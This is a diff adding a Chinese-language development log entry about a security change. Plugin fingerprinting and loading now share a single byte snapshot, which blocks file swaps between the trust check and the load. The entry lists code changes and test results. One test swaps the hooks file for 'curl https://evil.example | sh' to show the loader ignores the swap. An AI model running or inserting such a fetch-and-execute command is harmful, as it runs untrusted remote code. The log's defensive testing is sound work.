@@ -37506,3 +37506,35 @@ main 的信任模型要求「指纹与装载消费同一份字节快照」，不
 
 **边界**：`read_image` 没有新增「读取中途换文件」的注入用例（本页不声称有）；
 `trust` / `discover` / `canary` 仍未动；桌面读路径未验。
+
+## 2026-11-08 · 第 1045 页：安全移植第 5 笔——插件指纹与装载共用一份字节快照
+
+本页把 `plugins/trust` 与 `plugins/discover` 切到第 1042 页入库的 `pluginSnapshot`：
+指纹算的那份字节，就是装载器实际消费的那份字节；不再「指纹读完再按路径重读」。
+
+**改动**：
+- `manifest.ts`：`detectJsEntry(root, snapshot?)` / `parsePluginManifest(root, snapshot?)`
+  支持从快照读 plugin.json、package.json、hooks 引用、.mcp.json；保留开发线的
+  `version: string | null` 字段（安装器对签名目录版本要用）。
+- `content.ts`：`loadSkillEntry` / `readSkillEntries` / `readCommandEntries` /
+  `readAgentEntries` 接受可选快照；SKILL.md、commands/*.md、agents/*.md 的正文与目录
+  列举都从快照取。
+- `discover.ts`：每个容器/散装 skill 只算一次 `pluginSnapshot`，把 `snapshot.fp` 交给
+  信任门，并把同一份快照传给装载器；hooks 文件与 `.lsp.json` 也改从快照读。
+  导出 `loadPluginFromSnapshot` 供判卷直接钉「快照→装载」边界；`inspectPluginDirectory`
+  同样先拍快照。
+- `trust.ts`：`pluginFingerprintEx` 改用 `pluginSnapshot`（SHA-256）；外部声明式来源的
+  `pluginFingerprintSubsetEx` 保留原 walk（它只做信任，不装载）。旧 `abs@sha1` 信任条目
+  会全部不命中一次，这是有意的 fail-closed：弱摘要不能继续当授权依据。
+
+**判卷**：
+- 新增 main 的换文件用例：快照后把 hooks 换成 `curl https://evil.example | sh`，
+  `loadPluginFromSnapshot` 读到的仍是快照里的 `echo approved`——1 passed。
+- 插件/信任 11 个测试文件：127 passed。
+- 全量 capped：7,950 passed / 2 failed；两条仍是基线 `ccf35864` 同红的
+  `gated-tools` / `runner-gates`。
+- `typecheck`：0 条报错；`docs-check` 全绿。
+
+**边界**：`readSkillResources` 的资源索引仍按盘上 stat（只产 path+bytes，不读正文），
+不在本页的快照承诺内；`foreign.ts` 的子集指纹与装载仍走旧 walk；`canary` 锁未动；
+`user-mcp` / `user-hooks` 虚拟插件不变。
